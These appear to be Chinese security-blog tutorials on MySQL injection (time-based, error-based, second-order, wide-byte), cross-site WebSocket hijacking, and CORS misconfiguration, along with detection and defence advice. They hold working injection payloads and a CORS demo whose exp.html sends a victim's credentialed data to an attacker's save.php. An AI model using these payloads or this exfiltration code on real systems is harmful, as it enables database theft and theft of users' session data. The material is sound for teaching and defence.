如果没有可控的回显点，没有报错信息，bool真假页面无变化，可以考虑延时注入，常用函数如下： 123SLEEP (pauses)：休眠，参数为休眠的时长，单位秒IF(expr1,expr2,expr3)：判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句FIND_IN_SET(string, string_list)：返回字符串列表中字符串的位置 简单例子： 12341&apos; or sleep(2);1&apos; and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5));1&apos; union select 1,2,sleep(find_in_set(mid(@@version, 1, 1), &apos;0,1,2,3,4,5,6,7,8,9,.&apos;));1&apos; and if(ascii(substring((SELECT distinct concat(table_name) FROM information_schema.tables where table_schema=database() LIMIT 0,1),1,1))=116,sleep(5),1); 其他数据库的延时函数： 123Mysql： BENCHMARK(100000,MD5(1)) or sleep(5) Postgresql： PG_SLEEP(5) OR GENERATE_SERIES(1,10000) Mssql： WAITFOR DELAY &apos;0:0:5&apos; 报错注入 速查能力表 默认 MYSQL_ERRMSG_SIZE = 512 优先考虑函数显错长度，若函数回显长度未限制，则考虑Mysql报错内容长度限制 类别 函数 版本需求 5.5.x 5.6.x 5.7.x 8.x 函数显错长度 Mysql报错内容长度 额外限制 主键重复 floor、round ❓ ✔️ ✔️ ✔️ 64 列名重复 name_const ❓ ✔️ ✔️ ✔️ ✔️ join [5.5.49, ?) ✔️ ✔️ ✔️ ✔️ 数据溢出 - Double [5.5.5, 5.5.48] ✔️ MYSQL_ERRMSG_SIZE 数据溢出 - BIGINT 1e308 cot exp pow [5.5.5, 5.5.48] ✔️ MYSQL_ERRMSG_SIZE 几何对象 geometrycollection linestring multipoint multipolygon multilinestring polygon [?, 5.5.48] ✔️ 244 空间函数 Geohash ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash [5.7, ?) ✔️ ✔️ 128 GTID gtid_subset gtid_subtract [5.6.5, ?) ✔️ ✔️ ✔️ 200 JSON json_* [5.7.8, 5.7.11] ✔️ 200 UUID uuid_to_bin bin_to_uuid [8.0, ?) ✔️ 128 XPath extractvalue updatexml [5.1.5, ?) ✔️ ✔️ ✔️ ✔️ 32 Xpath语法错误-updatexml() 使用条件：mysql版本&gt;5.1.5 函数语法：updatexml(XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称 第二个参数：XPath_string (Xpath格式的字符串) 第三个参数：new_value，String格式，替换查找到的符合条件的数据 我们通常在第二个xpath参数填写我们要查询的内容。与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。 Payload构造： mysql&gt; select updatexml(1,concat(0x7e,version(),0x7e),1); updatexml(1,concat(0x7e,(普通注入语句),0x7e),1)–+基本就能注出数据了 mysql&gt; select extractvalue(1,concat(0x7e,user(),0x7e)); 前后添加~使其不符合xpath格式从而报错,因为Xpath语法只有遇到特殊字符时才会报错 Xpath语法错误-extractvalue() 原理分析 extractvalue(xml_str , Xpath) 函数,按照Xpath语法从XML格式的字符串中提取一个值，如果函数中任意一个参数为NULL,返回值都是NULL。 其实就是对XML文档进行查询的函数，相当于HTML文件中用$\\color{red}{}$等标签查找元素一样，第一个参数传入目标xml文档，第二个参数使用Xpath路径法表示的查找路径. 举个简单例子： select extractvalue(&#39;&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;/c&gt;aaaa&lt;/a&gt;&#39;,&#39;/a/c&#39;); 寻找前一段xml文档内容中的a节点下的c节点 12345+----------------------------------------------------------+| extractvalue(&apos;&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;/c&gt;aaaa&lt;/a&gt;&apos;,&apos;/a/c&apos;) |+----------------------------------------------------------+| accc |+----------------------------------------------------------+ 使用条件：Mysql版本&gt;5.1.5 函数语法：EXTRACTVALUE (XML_document, XPath_string); 利用原理与updatexml函数相同 payload: and (extractvalue(1,concat(0x7e,(select user()),0x7e))) floor()报错注入1234567select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2));/*concat: 连接字符串floor: 取float的整数值rand: 取0~1之间随机浮点值group by: 根据一个或多个列对结果集进行分组并有排序功能*/exp()报错注入 函数语法：exp(int) 适用版本：5.5.5~5.5.49，之后已不再支持溢出注入攻击 利用原理：引自 以 e 为底指数函数求值，配合~取反函数进行整数溢出报错 利用MySQL中的Double型数据溢出，当传递一个大于709的值时，函数exp()就会引起一个溢出错误。 $\\color{red}{注入Payload：}$select exp(~(select * FROM(SELECT USER())a)); 其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函数内，得到的结果将超过mysql的double数组范围，从而报错输出. Bigint数值操作 利用原理：当mysql数据库的某些边界数值进行数值运算时，会报错的原理。 如~0得到的结果：18446744073709551615 若此数参与运算，则很容易会错误。 payload: select !(select * from(select user())a)-~0; Type Storage (Bytes) Minimum Value Signed Minimum Value Unsigned Maximum Value Signed Maximum Value Unsigned TINYINT 1 -128 0 127 255 SMALLINT 2 -32768 0 32767 65535 MEDIUMINT 3 -8388608 0 8388607 16777215 INT 4 -2147483648 0 2147483647 4294967295 BIGINT 8 -2^63=-9223372036854775807 0 2^63-1=9223372036854775807 2^64-1=18446744073709551615 不存在的函数 利用原理：利用不存在的函数，可能会得到当前所在的数据库名称。 列名重复-name_const() mysql 列名重复也会报错，缺点目前只能报版本号 payload: select * from (select name_const(version(),0x1),name_const(version(),0x1))a; join using()注列名 适用版本：需要 version &gt;= 5.5.49 才可使用 利用原理： 通过系统关键词join可建立两个表之间的内连接。 通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。 并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。 123mysql&gt;select * from(select * from users a join (select * from users)b)c;mysql&gt;select * from(select * from users a join (select * from users)b using(username))c;mysql&gt;select * from(select * from users a join (select * from users)b using(username,password))c GTID相关函数 适用版本：需要 version =&gt; 5.6.5 才可使用 利用原理：参数格式不正确。 Payload：select target_function(&lt;payload&gt;, 0); 123mysql&gt;select gtid_subset(user(),1);mysql&gt;select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);mysql&gt;select gtid_subtract((select * from(select user())a),1); 二次注入涉及函数 addslashes() 函数返回在预定义字符之前添加反斜杠的字符串 mysql_r - mysql_real_escape_string() 函数转义 SQL 语句中 mysql_escape_string() — 转义一个字符串 漏洞原理 用户构造恶意数据存储在数据库，当数据库再次读取此数据时候造成注入。开发者对用户输入的数据做了过滤或者转义等处理，但写进数据库的还是“脏数据”，当 Web 应用调用“脏数据”时候发生了注入，概括起来很简单： 1、恶意数据的写入 2、恶意数据的调用 如下图所示： 题目实战SQL-labs24关便涉及到二次注入先来看一下登陆时的源码过滤函数将特殊符号给过滤掉了，所以直接注入是没戏的再来查看一下用户注册的源码同样过滤特殊字符，从注册进行注入也是不可能了最后看一下修改密码的源码同样如此，那就只能利用二次注入，先将恶意语句注入进数据库中，再调用我们先注册一个用户admin’#,密码设置为123，注册好之后查看一下数据库注册成功，这时其实我们就可以修改管理员admin，为什么那，来看下修改密码的sql语句我们用户名为admin’#，调用该用户时，SQL语句则变为了 堆叠注入涉及字符 分号（;），在SQL语句中用来表示一条sql语句的结束 原理分析 堆叠注入可以执行任意的语句 ，多条sql 语句一起执行。在MYSQL命令框中，常以;作为结束符，那我们便可以在一句SQL语句结束后再紧跟一句SQL语句 。 查数据库 但堆叠注入是有局限性的，并不是每个环境都可以用到的: 1、可能受到API或者数据库引擎不支持的限制 2、权限不足 宽字节注入涉及函数 addslashes() 函数返回在预定义字符之前添加反斜杠的字符串 mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符 mysql_escape_string() — 转义一个字符串 漏洞原因 为了防止 SQL 注入，PHP 提供了对特殊字符的转义功能： 1、magic_quotes_gpc=On，PHP配置，GPPC 在 PHP5.4 之后已经被官方移除。 2、addslashes，PHP函数。 这两种方法都是为了实现一个功能，为 POST、GET、COOKIE、$SERVER（该变量不受GPC保护） 过来的特殊字符前加反斜杠 \\（也就是做转义），如单引号 ‘、双引号 “、反斜线 \\、NULL（NULL 字符）等，但就是这个防止 SQL 注入的功能，成了 SQL 注入的突破点，为避免用户过度依赖这个不是特别安全的函数，GPC 在 PHP5.4 之后已经被官方移除。下面看看漏洞产生的过程： 1、构造语句 %df%27（%27 是单引号 &#39; ） ； 2、首先 addslashes 会在单引号前加反斜杠转义，变成 %df%5c%27（%5c 是反斜杠 \\ ）； 3、然后因为数据库设置了 GBK 编码，GBK 是双字节编码，发现 %df%5c 在其汉字编码范围内，于是 %df%5c 被转换成”運”，单引号 %27 逃逸； 4、最后MySQL查询时候执行的其实是 運&#39;，单引号可闭合代码造成注入漏洞。 5、过程 %df%27–(addslashes)–%df%5c%27–(GBK编码)–運’ 异或注入涉及符号 MySQL中，异或用^或xor表示 原理分析 异或注入原理较为简单一些，运算法则就是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1），null与任何条件做异或运算都为null 简单在mysql命令行演示一下： 用异或方法可以判断一些字符是否被过滤，如:","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"前端安全之跨域安全（下）","slug":"前端安全-前端安全之跨域安全（下）","date":"2019-12-28T07:30:08.000Z","updated":"2020-02-16T16:19:05.876Z","comments":true,"path":"2019/12/28/前端安全-前端安全之跨域安全（下）/","link":"","permalink":"http://www.vkxss.top/2019/12/28/前端安全-前端安全之跨域安全（下）/","excerpt":"","text":"0x01 WebSocket 基本概念 0x02 CSWSH漏洞 0x03 防御 alert(/来了老弟/) 0x01 WebSocket基本概念 一般的，Web应用的交互过程通常是客户端通过浏览器发出一个请求，服务器端接收请求后进行处理并返回结果给客户端，客户端浏览器将信息呈现。这种机制对于信息变化不是特别频繁的应用尚可，但却不适用于高并发与用户实时响应的场景，比如股票的实时信息、地图导航等。 于是，基于HTML5规范的、有Web TCP之称的WebSocket应运而生。 WebSocket是HTML5一种新的协议，它实现了浏览器和服务器全双工通信，更好地节省服务器资源和宽带并达到实时通讯，它建立在TCP之上，同HTTP一样通过TCP来传输数据，但和HTTP协议的不同点在于： WebSocket是持久化的协议，而HTTP是非持久连接； WebSocket是一种双向通信协议，在建立连接后，WebSocket服务器和浏览器/客户端代理都能主动地向对方发送或接收数据，就像Socket一样，而HTTP是单向通信协议； WebSocket需要类似TCP的三次握手连接，但和TCP不同的是，WebSocket是基于HTTP协议进行的握手，连接成功后才能相互通信； WebSocket具有功能强大、双向、低延迟等特征，特别是针对实时的、事件驱动的Web应用程序而言，不惜要的网络流量和延迟得以显著减少，通信效率和应用程序表现大大提升； WebSocket定义了两种URI格式：ws://和wss://，类似于HTTP和HTTPS，ws://使用明文传输，默认端口为80，wss://使用TLS加密传输，默认端口为443。 优点： 支持双向通信，实时性比较强 更好的二进制支持 较少的开销。创建连接后，数据交换时候不用携带所有的数据头部信息 支持拓展 缺点： 缺少认证机制 存在跨站点劫持漏洞 其他一些头字段解释如下： 12345678910HTTP头 是否必须 解释Host 是 服务端主机名Upgrade 是 固定值，”websocket”Connection 是 固定值，”Upgrade”Sec-WebSocket-Key 是 客户端临时生成的16字节随机值, base64编码Sec-WebSocket-Version 是 WebSocket协议版本Origin 否 可选, 发起连接请求的源Sec-WebSocket-Accept 是(服务端) 服务端识别连接生成的随机值Sec-WebSocket-Protocol 否 可选，客户端支持的协议Sec-WebSocket-Extensions 否 可选， 扩展字段 两个重要的安全头，Sec-WebSocket-Key与Sec-WebSocket-Accept：客户端负责生成一个Base64编码过的随机数字作为Sec-WebSocket-Key，服务器则会将一个GUID和这个客户端的随机数一起生成一个散列Key作为Sec-WebSocket-Accept返回给客户端。这个工作机制可以用来避免缓存代理（caching proxy），也可以用来避免请求重播（request replay）。 出于安全考虑而设计的，以“Sec-”开头的头字段可以避免被浏览器脚本读取到，这样攻击者就不能利用XHR来伪造WebSocket请求来执行跨协议攻击，因为XHR接口不允许设置Sec-开头的Header。 WebSocket属性 123属性 描述Socket.readyState 只读属性 readyState 表示连接状态，可以是以下值：0 - 表示连接尚未建立。1 - 表示连接已建立，可以进行通信。2 - 表示连接正在进行关闭。3 - 表示连接已经关闭或者连接不能打开。Socket.bufferedAmount 只读属性 bufferedAmount 已被 send() 放入正在队列中等待传输，但是还没有发出的 UTF-8 文本字节数。 WebSocket事件 12345事件 事件处理程序 描述open Socket.onopen 连接建立时触发message Socket.onmessage 客户端接收服务端数据时触发error Socket.onerror 通信发生错误时触发close Socket.onclose 连接关闭时触发 WebSocket方法 123方法 描述Socket.send() 使用连接发送数据Socket.close() 关闭连接 0x02 CSWSH漏洞 CSWSH全称Cross-site WebSocket Hijacking，跨站点WebSocket劫持漏洞。 漏洞场景 支持WebSocket协议的Web站点如股票实时查询、地图导航等，并且未对请求的Origin头字段进行校验。 漏洞原理 CSWSH漏洞类似于全能型的CSRF漏洞，可读可写。 漏洞根源是WebSocket天生可跨域，不受同源策略的影响。在此基础上，若目标服务端未对WebSocket协议请求的Origin头字段进行校验，则会导致WebSocket协议请求可被攻击者劫持，从而窃取敏感信息。 漏洞场景 目标站点存在cookie校验机制的场景 1、用户首先登录stock.com实时查询股票信息，其中该站点支持WebSocket，需要用户携带cookie访问； 2、接着用户被诱使在当前的浏览器访问beauty.com，其中加载了恶意JS代码到用户的浏览器中执行； 3、恶意JS代码通过WebSocket协议向stock.com站点发起请求，此时请求是用户浏览器发起的、是自动带上cookie信息的； 4、stock.com收到恶意JS发送的WebSocket请求，由于未校验ws://请求的Origin头字段，在检测cookie合法后，返回敏感信息到用户浏览器； 5、用户浏览器中的恶意JS收到stock.com响应的WebSocket协议响应信息后，发往攻击者服务器，从而造成跨站点WebSocket劫持攻击； 检测方法 修改请求报文中的Origin头字段，重放该WebSocket协议升级请求，若服务器返回101响应则表示连接成功即未对源进行检测，则可能存在CSWSH漏洞。 最好是进一步测试是否可以发送WebSocket消息，若这个WebSocket连接能够发送/接受消息的话，则完全证明CSWSH漏洞的存在。 一般的漏洞挖掘步骤： 找到支持WebSocket的站点； 使用ZAP/BURP等代理工具重放切换WebSocket协议的报文，其中修改Origin头查看服务端是否校验Origin头； 若未校验Origin头，则进一步发送WebSocket连接报文查看能否成功利用； POC 使用JavaScript创建Websocket请求： 123456789101112131415161718 &lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;function ws_attack()&#123;//自定义函数ws_attack //定义函数功能 //创建WebSocket并赋值给ws变量 var ws = new WebSocket(&quot;ws://域名:端口/&quot;);//如果请求的Websocket服务仅支持HTTP就写成ws://，如果请求的Websocket服务支持HTTPs就写成wss:// ws.onopen = function(evt) &#123; //当ws(WebSocket)处于连接状态时执行 ws.send(&quot;来了老弟&quot;); &#125;; ws.onmessage = function(evt) &#123; //当ws(WebSocket)请求有响应信息时执行 //注意：响应的信息可以通过evt.data获取！例如：alert(evt.data); ws.close(); &#125;;&#125;ws_attack();//执行ws_attact函数&lt;/script&gt; 漏洞挖掘 进行CSWSH漏洞挖掘前需要准备好一款可以重放WebSocket协议报文的代理工具，Burp是做不到的，但是我们可以选择OWASP ZAP来实现。 一般的漏洞挖掘步骤： 找到支持WebSocket的站点； 使用ZAP等代理工具重放切换WebSocket协议的报文，其中修改Origin头查看服务端是否校验Origin头； 若未校验Origin头，则进一步发送WebSocket连接报文查看能否成功利用； 当然，切换协议的请求报文依然是可以使用Burp来完成的，这里修改Origin头之后再重放报文，发现成功响应101报文，证明该站点未校验Origin，可能存在CSWSH漏洞： 案例 1、如下请求： 1234567GET / HTTP/1.1Host: localhost:8080Origin: http://127.0.0.1:3000Connection: UpgradeUpgrade: websocketSec-WebSocket-Version: 13Sec-WebSocket-Key:w4v7O6xFTi36lq3RNcgctw== 2、篡改Origin，发现没有对Origin进行验证 3、验证发现可以请求并成功进行重放，存在Websocket跨域劫持（这里只是简单的评论请求，危害就是：点我链接让你评论我想评论的，试想：如果是修改密码的WebSocket请求存在劫持那么问题就大了～） 漏洞利用 攻击流程跟以往的交互类漏洞没什么区别（点我链接读取你XXX、点我链接让你XXX）： 0x03 防御 防御方法 WebSocket 令牌机制 服务器端为每个 WebSocket 客户端生成唯一的一次性 Token；客户端将 Token 作为 WebSocket 连接 URL 的参数（譬如 ws://http://echo.websocket.org/?token＝randomOneTimeToken），发送到服务器端进行 WebSocket 握手连接；服务器端验证 Token 是否正确，一旦正确则将这个 Token 标示为废弃不再重用，同时确认 WebSocket 握手连接成功；如果 Token 验证失败或者身份认证失败，则返回 403 错误。 使用白名单校验请求报文的Origin头字段； 在服务器端的代码中增加 Origin 检查，如果客户端发来的 Origin 信息来自不同域，建议服务器端拒绝这个请求，发回 403 错误响应拒绝连接 1234567891011实例代码：public class CustomConfigurator extends ServerEndpointConfig.Configurator &#123; private static final String ORIGIN = &quot;http://jeremy.laptop:8080&quot;; @Override public boolean checkOrigin(String originHeaderValue) &#123; if(originHeaderValue==null || originHeaderValue.trim().length()==0) return true; return ORIGIN.equals(originHeaderValue); &#125;&#125;","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://www.vkxss.top/categories/前端安全/"}],"tags":[{"name":"前端知识","slug":"前端知识","permalink":"http://www.vkxss.top/tags/前端知识/"}]},{"title":"前端安全之跨域安全（中）","slug":"前端安全-前端安全之跨域安全（中）","date":"2019-12-15T07:30:08.000Z","updated":"2020-02-16T05:19:21.410Z","comments":true,"path":"2019/12/15/前端安全-前端安全之跨域安全（中）/","link":"","permalink":"http://www.vkxss.top/2019/12/15/前端安全-前端安全之跨域安全（中）/","excerpt":"","text":"0x01 CORS相关基本概念 SOP CORS 原理与工作流程 基本用法 几个关键的HTTP头字段 请求分类 一些跨域场景 应用Demo 0x02 CORS跨域漏洞 0x03 工具 0x04 检测方法 黑盒 白盒 0x05 防御方法 alert(/来了老弟/) 0x01 CORS相关基本概念SOP SOP（Same Origin Policy）同源策略，是浏览器的一个安全基石，浏览器的同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。那么何为同源呢，即两个站点需要满足同协议，同域名，同端口这三个条件。 但随着Web应用的发展，出于一些网络业务的需求，需要实现一些资源的跨域访问，这就造就了一些跨域技术的出现，而下面主要讲下两种最为常见的跨域技术。 CORS原理与工作流程 CORS（Cross-Origin Resource Sharing）跨源资源共享，是HTML5的一个新特性，其思想是使用自定义的HTTP头部让浏览器与服务器进行沟通，它允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服AJAX只能同源使用的限制。 CORS的基本原理是，第三方网站服务器生成访问控制策略，指导用户浏览器放宽 SOP 的限制，实现与指定的目标网站共享数据。 相比之下，CORS较JSONP更为复杂，JSONP只能用于获取资源（即只读，类似于GET请求），而CORS支持所有类型的HTTP请求，功能完善。 CORS具体工作流程可分为三步，如图所示： 请求方脚本从用户浏览器发送跨域请求。浏览器会自动在每个跨域请求中添加Origin头，用于声明请求方的源； 资源服务器根据请求中Origin头返回访问控制策略(Access-Control-Allow-Origin响应头)，并在其中声明允许读取响应内容的源； 浏览器检查资源服务器在Access-Control-Allow-Origin头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许； 在CORS协议中，请求方还可以指示浏览器在跨域请求中是否带credentials（包括Cookie，TLS客户端证书和代理验证信息）。如果跨域请求中带了credentials，那么浏览器会检查资源服务器返回的响应头中Access-Control-Allow-Credentials头是否设置为true，如果是，则允许请求方读取响应内容，否则，不允许。 基本用法 当b.com服务器想要与a.com共享资源内容时，它只需要在HTTP响应中添加如下响应头。这个响应头告诉浏览器放宽SOP限制，允许a.com脚本读取响应内容： 12Access-Control-Allow-Origin: http://a.comAccess-Control-Allow-Credentials: true a.com则可以通过以下JavaScript脚本，跨域读取b.com服务器的内容： 123456789var xhr=new XMLHttpRequest();xhr.onreadystatechange = function() &#123; if (xhr.readyState == XMLHttpRequest.DONE) &#123; alert(xhr.responseText); &#125; &#125;xhr.open(“GET“, ”http://b.com/api“, true);xhr.withCredentials = true;xhr.send(); 几个关键的HTTP头字段 CORS中关键的几个HTTP头字段如下： Access-Control-Allow-Origin：指定哪些外域可以访问本域资源； Access-Control-Allow-Credentials：指定浏览器是否将使用请求发送Cookie。仅当设置为true时，才会发送Cookie； Access-Control-Allow-Methods：指定可以使用哪些HTTP请求方法（GET、POST、PUT、DELETE等）来访问资源； Access-Control-Allow-Headers：指定可以在请求报文中添加的HTTP头字段； Access-Control-Max-Age：指定超时时间； 请求分类 浏览器将CORS请求分成两类，即简单请求和非简单请求。 简单请求 简单请求满足以下条件： 1、使用下列方法之一：GET、HEAD、POST 2、HTTP的头信息不超出以下几种字段:Accept、Accept-Language、Content-Language、Content-Type（其值仅限于：application/x-www-form-urlencoded、multipart/form-data、text/plain） 简单请求如图所示，浏览器与服务器之间请求只进行了一次： 非简单请求 简单地说就是简单请求以外的请求都算非简单请求。 不满足简单请求条件的请求则要先进行预检请求，即使用OPTIONS方法发起一个预检请求到服务器，用于浏览器询问服务器当前网页所在的域名是否在服务器允许访问的白名单中，以及允许使用哪些HTTP方法和字段等。只有得到服务器肯定的相应，浏览器才会发送正式的XHR请求，否则报错。 关于预检请求，需要注意一下两点： 预检请求对JS来说是透明的，即JS获取不到预检请求的任何信息； 预检请求并不是每次请求都发生，服务端设置的Access-Control-Max-Age头部指定了预检请求的有效期，在有效期内的非简单请求不需要再次发送预检请求； 非简单请求如下所示： 一些跨域场景 比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。 程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送ajax请求，请求另外一个页面的内容的时候，就会跨域。 电商网站想通过用户浏览器加载第三方快递网站的物流信息。 子站域名希望调用主站域名的用户资料接口，并将数据显示出来。 应用Demo 编写两个不同域下的文件cors.html和cors.php，cors.html放在本域下、目标是跨域获取cors.php中的内容，cors.php放在其他域下，这里本地测试就直接使用不同IP访问代表不同的域名，而不改hosts文件了。 cors.html： 12345678910111213141516&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot; /&gt;&lt;title&gt;CORS Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&apos;userInfo&apos;&gt;&lt;/div&gt;&lt;/body&gt;&lt;script src=&quot;https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; var url = &quot;http://10.211.55.7/demo/cors/cors.php&quot;; $.get(url, &#123;a:&quot;getUserInfo&quot;&#125;, function(data) &#123; $(&quot;#userInfo&quot;).text(&quot;Id:&quot; + data.uid + &quot; Name:&quot; + data.name); &#125;, &quot;json&quot;);&lt;/script&gt;&lt;/html&gt; cors.php，先注释掉CORS跨域必需的相关HTTP头字段： 1234567891011121314&lt;&lt;?php //header(&apos;Access-Control-Allow-Origin: *&apos;);//header(&apos;Access-Control-Allow-Credentials: true&apos;);$a = !empty($_GET[&apos;a&apos;]) ? trim($_GET[&apos;a&apos;]) : &apos;&apos;;if($a == &apos;getUserInfo&apos;) &#123; echo json_encode(array( &apos;uid&apos; =&gt; 1, &apos;name&apos; =&gt; &apos;VK&apos;, ));&#125; else &#123; echo &apos;&apos;;&#125; ?&gt; 访问本域的cors.html，发现不能成功从外域的cors.php中获取内容，在控制台会报错显示没有Access-Control-Allow-Origin字段： 接着我们将cors.php中的那两句注释去掉： 12header(&apos;Access-Control-Allow-Origin: *&apos;);header(&apos;Access-Control-Allow-Credentials: true&apos;); 再次访问本域的cors.html，跨域发现成功获取到外域的cors.php中的响应内容并显示到页面中： 0x02 CORS跨域漏洞 漏洞点 CORS跨域漏洞的本质是服务器配置不当，即Access-Control-Allow-Origin设置为星号或是直接取自请求头Origin字段，Access-Control-Allow-Credentials设置为true。 攻击过程 整个攻击过程如下： 1、用户通过浏览器使用账号密码登录访问正常网站a.com后，此时带有Cookie保持在a.com的登录状态； 2、攻击者诱使用户在同一浏览器打开访问恶意站点b.com； 3、用户在访问过a.com的同一浏览器打开访问b.com后，b.com后台接收到用户请求并返回恶意代码给浏览器，让浏览器带上Cookie请求访问a.com页面上的敏感信息； 4、a.com判断用户Cookie信息后，正常处理该恶意请求，并返回敏感数据； 5、攻击者成功通过CORS跨域漏洞获取到用户的敏感信息； POC 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;CORS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h2&gt;CORS&lt;/h2&gt;&lt;textarea rows=&quot;20&quot; cols=&quot;60&quot; id=&quot;VK&quot;&gt;&lt;/textarea&gt;&lt;br&gt;&lt;button type=&quot;button&quot; onclick=&quot;cors()&quot;&gt;Exploit&lt;/button&gt;&lt;/div&gt;&lt;script&gt;function cors() &#123; var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() &#123; if (this.readyState == 4 &amp;&amp; this.status == 200) &#123; document.getElementById(&quot;VK&quot;).innerHTML = this.responseText; &#125; &#125;; xhttp.open(&quot;GET&quot;, &quot;漏洞URL&quot;, true); xhttp.setRequestHeader(&apos;token&apos;, &apos;xxxx&apos;); xhttp.withCredentials = true; xhttp.send();&#125;&lt;/script&gt;&lt;/html&gt; CORS与CSRF的区别 一般有CORS漏洞的地方都有CSRF。 CSRF一般使用form表单提交请求，而浏览器是不会对form表单进行同源拦截的，因为这是无响应的请求，浏览器认为无响应请求是安全的。 浏览器的同源策略的本质是：一个域名的JS，在未经允许的情况下是不得读取另一个域名的内容，但浏览器并不阻止向另一个域名发送请求。 相同点：都需要第三方网站；都需要借助Ajax的异步加载过程；一般都需要用户登录目标站点。 不同点：一般CORS漏洞用于读取受害者的敏感信息，获取请求响应的内容；而CSRF则是诱使受害者点击提交表单来进行某些敏感操作，不用获取请求响应内容。 Demo 这里本地进行漏洞模拟利用，当然CORS跨域漏洞分无需Cookie和需Cookie的情况，由于无需Cookie的情景过于简单，于是这里仅演示有Cookie的情况。 目标外域站点放置两个文件，login.php和secret.php。login.php，用于给用户登录目标站点，此时可以生成对应的Cookie信息： login.php，用于给用户登录目标站点，此时可以生成对应的Cookie信息： 1234&lt;?phpsetcookie(&quot;SESSIONid&quot;,&quot;this_is_session_id_&quot;.time(),time()+3600,&quot;&quot;,&quot;&quot;,0);setcookie(&quot;username&quot;,&quot;VK&quot;.time(),time()+3600,&quot;&quot;,&quot;&quot;,0,1);?&gt; secret.php，根据请求报文的Origin字段来设置ACAO字段，ACAC字段设置为true，其中含有phpinfo的敏感信息： 1234567&lt;&lt;?php if(isset($_SERVER[&quot;HTTP_ORIGIN&quot;])) &#123; header(&apos;Access-Control-Allow-Origin:&apos;.$_SERVER[&quot;HTTP_ORIGIN&quot;]);&#125;header(&quot;Access-Control-Allow-Credentials: true&quot;);phpinfo(); ?&gt; 在本域下放置两个文件，exp.html和save.php。 exp.html，： 12345678910111213141516171819202122232425262728293031323334&lt;html&gt;&lt;h1&gt;Hello I evil page. &lt;/h1&gt;&lt;script type=&quot;text/javascript&quot;&gt;function loadXMLDoc()&#123; var xhr1; var xhr2; if(window.XMLHttpRequest) &#123; xhr1 = new XMLHttpRequest(); xhr2 = new XMLHttpRequest(); &#125; else &#123; xhr1 = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); xhr2= new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); &#125; xhr1.onreadystatechange=function() &#123; if(xhr1.readyState == 4 &amp;&amp; xhr1.status == 200) //if receive xhr1 response &#123; var datas=xhr1.responseText; xhr2.open(&quot;POST&quot;,&quot;http://10.211.55.7/demo/cors/save.php&quot;,&quot;true&quot;); xhr2.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xhr2.send(&quot;T1=&quot;+escape(datas)); &#125; &#125; xhr1.open(&quot;GET&quot;,&quot;http://192.168.1.3/cors/secret.php&quot;,&quot;true&quot;) //request user page. xhr1.withCredentials = true; //request with cookie xhr1.send();&#125;loadXMLDoc();&lt;/script&gt;&lt;/html&gt; save.php，当接收到POST方式传递的T1参数内容时，将内容写入当前Web目录的secret.html文件中： 123456&lt;?php$myfile = fopen(&quot;./secret.html&quot;, &quot;w+&quot;) or die(&quot;Unable to open file!&quot;);$txt = $_POST[&apos;T1&apos;];fwrite($myfile, $txt);fclose($myfile);?&gt; 下面开始模拟攻击场景。 首先受害者访问目标外域站点，需要访问login.php进行登录操作，被目标站点设置了Cookie： 接着登录成功之后，受害者带着Cookie信息可以正常访问secret.php页面，其中是phpinfo信息，包含用户cookie等敏感信息： 在此之后，攻击者向受害者发送一个恶意链接，诱使受害者访问。 当受害者访问过后，可以看到是会带着当前浏览器对目标外域站点维持着的Cookie信息去请求目标外域站点的secret.php获取内容，并将响应内容POST到攻击者的save.php中进行记录： 恶意链接：http://10.211.55.7/demo/cors/exp.html 此时，攻击者只需访问自己本域Web站点根目录下的secret.html即可，当受害者被成功诱使点击之后就会存在该文件并记录下目标外域站点的敏感信息内容： 另外有个注意点，如果目标外域站点的secret.php中的ACAO字段设置为星号时，浏览器会阻止我们获取响应报文的内容，因为这是浏览器最后一道防线对用户最后的保护。 0x03 工具 推荐Github的项目CORScanner：https://github.com/chenjj/CORScanner 0x04 检测方法黑盒 发送请求报文，然后查看响应报文是否包含Access-Control-Allow-Origin字段，若包含且会星号，则存在CORS跨域漏洞，或若包含但不为星号则修改请求报文头的Origin字段查看ACAO是否改变，若改变则说明存在CORS跨域漏洞。 白盒 在源码中搜索设置响应报文头字段的代码，如response.setHeader()，检测是否配置或正确配置Access-Control-Allow-Origin和Access-Control-Allow-Credentials字段。 